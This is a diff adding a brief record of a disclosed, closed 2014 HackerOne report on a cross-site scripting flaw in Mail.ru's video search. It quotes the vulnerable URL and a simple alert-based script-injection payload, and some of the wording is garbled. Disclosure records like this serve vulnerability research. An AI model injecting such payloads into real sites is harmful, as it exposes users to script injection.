@@ -1,0 +1,17 @@
+ReportLink:https://hackerone.com/reports/8448
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/chandrakant
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:08.07.2014 9:59:11
+
+Summary:
+
+http://my.mail.ru/video/search?
+
+plyload
+"><script>alert('XSS BY CK')</script>
+
+Find ON screens hot
